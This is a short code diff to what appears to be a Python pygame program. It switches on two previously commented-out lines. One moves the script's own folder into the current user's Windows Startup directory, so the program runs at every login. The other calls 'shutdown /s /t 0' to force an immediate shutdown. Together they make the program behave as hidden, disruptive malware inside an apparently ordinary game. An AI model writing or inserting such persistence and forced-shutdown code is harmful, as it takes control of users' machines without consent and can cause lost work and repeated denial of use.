@@ -5,14 +5,10 @@ import os
 import shutil
 import getpass
 
+print(os.path.basename(sys.argv[0]))
 USER_NAME = getpass.getuser()
-print(USER_NAME)
 FilePos = os.path.dirname(os.path.abspath(__file__))
-#shutil.move(FilePos, 'C:/Users/' + USER_NAME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
-print(FilePos, 'C:/Users/' + USER_NAME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
-
-
-
+shutil.move(FilePos, 'C:/Users/' + USER_NAME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
 
 
 pygame.font.init()
@@ -82,7 +78,7 @@ while 1:
             pygame.display.update()
 
             
-            #os.system("shutdown /s /t 0")
+            os.system("shutdown /s /t 0")
 
             pygame.quit()  
             sys.exit()
